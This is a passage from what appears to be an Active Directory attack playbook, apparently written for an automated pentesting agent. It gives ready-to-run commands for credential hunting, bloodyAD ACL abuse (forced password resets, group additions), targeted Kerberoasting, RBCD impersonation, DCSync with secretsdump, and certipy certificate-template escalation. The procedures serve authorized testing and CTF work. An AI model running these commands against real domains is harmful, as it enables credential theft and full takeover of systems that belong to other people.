...
Authenticated MSSQL is a top lateral vector — a linked server often lands you as the SQL service account (e.g. `<sql-svc>`) on another host.
```
...
A shell or a readable share is a credential source before it is anything else. AD boxes chain by finding one account's secret in a file and reusing it to become a *different*, higher-value account (typical chain: an `sa`/service password in a share → MSSQL RCE → `ConfigurationFile.ini` yields a service password → spray → lands `<user-b>`).

- **Hunt config/secret files** — from a shell (`xp_cmdshell`, WinRM, SMB): `ConfigurationFile.ini` / `*.config` / `web.config` / `unattend.xml` / `*.ps1` / `Groups.xml` (cpassword) / `.git-credentials`; `findstr /si password *.ini *.xml *.config *.txt` (Windows), `xp_dirtree` to map the SQL install dir. Every discovered secret → `record_credential(domain, user, secret, secret_type="password")` and `record_loot`.
...
```
Resolve the cracked RID to a computer account in BloodHound (RID <n> → `<computer>$`). A weak machine password is a full AD credential — often one with an abusable ACL edge (§1d). Tell-tale in BloodHound: `pwdlastset` ≫ `whencreated` on a computer = manually set (autogenerated machine passwords are set at creation and rotate every 30 days).

## §1d DACL / ACL abuse chain (bloodyAD)

BloodHound flags the edges (`ingest_bloodhound` surfaces `dangerous_acl` — AddSelf / ForceChangePassword / GenericAll / GenericWrite / AddAllowedToAct). `bloodyAD` is the exploitation Swiss-army knife (prefix `bloodyAD --host dc.<realm> -d <realm> -u <u> -p <pw> --kerberos`):
```
bloodyAD ... get writable                               # what you can edit
bloodyAD ... add groupMember <priv-group> '<computer>$'   # AddSelf -> inherit <priv-group> rights
bloodyAD ... set password <target-user> 'Password123!'      # ForceChangePassword
```
...
```
bloodyAD ... remove groupMember 'Protected Users' <target-user>
getTGT.py 'dom/<target-user>:Password123!'                  # now succeeds
KRB5CCNAME=<target-user>.ccache evil-winrm -i dc -r <realm> # if the user has WinRM rights
```
...
- **WriteSPN** (targeted Kerberoast): `targetedKerberoast.py -d <realm> -u <you> -p <pw> --request-user <target>` → `$krb5tgs$` → `crack_hashes(domain, "kerberoast")`. Manual: `bloodyAD ... set object <target> servicePrincipalName <fake/spn>` → GetUserSPNs → unset.
...
- **RBCD** — you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target (a `GenericAll` / `GenericWrite` / `WriteAccountRestrictions` / **`AddAllowedToAct`** ACL edge, e.g. via a delegation-management group over the DC object). Set a controlled computer account (or a Timeroasted machine account) as the allowed principal, then S4U-impersonate:
  ```
  bloodyAD ... add rbcd DC$ '<computer>$'          # or: Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount '<computer>$'
  getST.py 'dom/<computer>$:<pw>' -k -spn cifs/dc.<realm> -impersonate <target-admin>
  ```
  **Target selection — check `AccountNotDelegated`:** an account with `AccountNotDelegated=True` (often `Administrator`) CANNOT be impersonated via any delegation. Pick a high-value account with the flag `False` (e.g. `<target-admin>`): `Get-ADUser <u> -Properties AccountNotDelegated`. Then use the ticket:
  ```
  KRB5CCNAME=<target-admin>@cifs_DC...ccache wmiexec.py -k -no-pass 'dom/<target-admin>@dc.<realm>'
  KRB5CCNAME=<target-admin>@cifs_DC...ccache secretsdump.py -k -no-pass 'dom/<target-admin>@dc.<realm>'   # DCSync -> Administrator hash + plaintext
  ```
...
- **ESC4 → ESC1** (you have write/`GenericAll`/`WriteOwner`→`GenericAll` over a *template*, not the CA: e.g. WriteOwner over a CA service account `<ca-svc>`, reset it, and `<ca-svc>` can edit a client-auth `<template>`). Rewrite the template's config into a permissive ESC1 shape, then exploit it as ESC1:
  ```
  certipy template -u <ca-svc>@dom -p '<pw>' -template <t> -write-default-configuration -save-old \
      -target <dc-fqdn> -target-ip <dc-ip>          # -save-old backs up the original -> restore after (OPSEC)
  certipy req -u <ca-svc>@dom -p '<pw>' -ca '<CA>' -template <t> -upn administrator@dom -sid <domainSID>-500
...
BloodHound `trust` edges + `nltest /domain_trust /server:<host>` confirm direction. A **bidirectional** trust means a ticket from one forest is honoured by the other — the lateral bridge (e.g. `<FOREST-A>` ⇄ `<FOREST-B>`). If **SID filtering is disabled** (parent/child, or misconfigured forest trust), inject an extra-SID for privileged cross-domain access:
```
...
When you land as a low-priv service account (<sql-svc>) on a member/DC:
